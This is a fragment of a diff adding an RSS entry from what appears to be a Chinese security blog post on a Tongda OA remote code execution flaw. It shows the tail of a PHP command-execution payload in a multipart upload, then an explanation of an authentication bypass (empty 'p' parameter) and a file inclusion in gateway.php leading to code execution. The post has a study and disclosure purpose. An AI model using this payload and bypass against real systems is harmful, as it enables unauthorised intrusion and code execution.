+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$stdout &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $exec&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;StdOut&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$stroutput &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $stdout&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ReadAll&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $stroutput;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;------WebKitFormBoundarypyfBh1YB4pV8McGB--
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;/ispirit/interface/gateway.php&lt;/code&gt; 存在文件包含漏洞&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;p&lt;/code&gt;为空即可绕过身份认证，如下可知，可从json中获取url参数的值&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%207.png&#34; alt=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%207.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;如下38行需校验传递参数中是否包含&lt;code&gt;general/、ispirit/、module/&lt;/code&gt; ，如果包含url参数的值即可执行include_once，从而文件包含&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%208.png&#34; alt=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%208.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;如下图，成功成功文件包含并代码执行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%209.png&#34; alt=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%209.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;网上有很多复现的文章，但是如果是为了学习的话最好还是自己通读一边代码。&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
